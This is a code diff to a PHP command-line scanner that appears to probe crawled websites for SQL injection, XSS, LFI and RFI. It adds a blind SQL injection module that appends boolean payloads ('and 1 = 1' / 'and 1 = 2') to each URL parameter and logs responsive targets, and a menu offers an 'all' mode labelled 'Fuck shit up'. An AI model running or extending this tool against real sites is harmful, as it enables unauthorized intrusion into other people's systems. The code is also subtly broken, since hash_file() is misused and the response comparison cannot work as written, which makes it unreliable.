@@ -854,10 +854,52 @@ if(preg_match_all("'<a.*?href=\"(http[s]*://[^>\"]*?)\"[^>]*?>(.*?)</a>'si", fil
 
 }
 
+function blind_sqli($link) {
+	$cleanHashCode = hash_file(file_get_contents($link));
+		
+	//first check if website is dynamic
+	if($cleanHashCode == hash_file(file_get_contents($link)))
+	{
+	
+		if(strpos($link, '=') !== false) {
+			$urls = array();
+			$params = explode("?", $link);
+			$params = explode("&", $params[1]);
+			foreach($params as $param)
+			{
+				$KeyValuePair = explode("=",$param);
+				$urls[] .= str_replace($param, $KeyValuePair[0] . "=" . $KeyValuePair[1] . " and 1 = 1", $link); //We should add possibilitys of pre- and suffixes
+				$urls[] .= str_replace($param, $KeyValuePair[0] . "=" . $KeyValuePair[1] . " and 1 = 2", $link);
+			}
+			
+			for($i = 0; $i < count($urls); $i+=2)
+			{
+				$true = $urls[$i];
+				$false = $urls[$i+1];
+				
+				if($cleanHashCode == hash_file(file_get_contents($true)))
+				{
+					if($cleanHashCode != hash_file(file_get_contents($false)))
+					{
+						$text = $urls[$i] . "\n";
+						$handle = fopen('out/sqli.txt', 'a+');
+						fwrite($handle, $text);
+						fclose($handle);
+						print "\033[1;37m1\033[0;37m";
+					}
+					else {
+						print '0';
+					}
+				}
+			}
+		}
+	}
+	else {
+		print '0';
+	}
+}		
 
 function sqli($link) {
-
-
 if(strpos($link, '=') !== false) {
    	$linki = array();
     $zmienne = explode("?",  $link);
@@ -1170,11 +1212,12 @@ if(!file_exists('out')) {
 function scan() {
 
 print "\n  Options:\n";
-print "    sqli - SQL Injection\n";
-print "    xss - Cross Site Scripting\n";
-print "    lfi - Local File Inclusion\n";
-print "    rfi - Remote File Inclusion\n";
-print "    all - Fuck shit up\n";
+print "    sqli 		- SQL Injection\n";
+print "    blind_sqli 		- Blind SQL Injection\n";
+print "    xss 			- Cross Site Scripting\n";
+print "    lfi 			- Local File Inclusion\n";
+print "    rfi 			- Remote File Inclusion\n";
+print "    all 			- Fuck shit up\n";
 print "     What: ";
 
 $choice = fopen ("php://stdin","r");
@@ -1196,6 +1239,15 @@ if(trim($what) == 'sqli' || trim($what) == 'all' || trim($what) == 'sqli&xss') {
     	sqli(urldecode($link));
     }
 
+}
+
+if(trim($what) == 'blind_sqli' || trim($what) == 'all' || trim($what) == 'blind_sqli&xss' || trim($what) == 'sqli&blind_sqli&xss') {
+
+	print "\n\n - Testing Blind SQL Injection for " .count(file('out/'.$whatf)). " parameters ($whatf)\n";
+	$urls = file('out/'.$whatf);
+    foreach($urls as $link) {
+    	blind_sqli(urldecode($link));
+    }
 }
 
 if(trim($what) == 'xss' || trim($what) == 'all' || trim($what) == 'sqli&xss') {
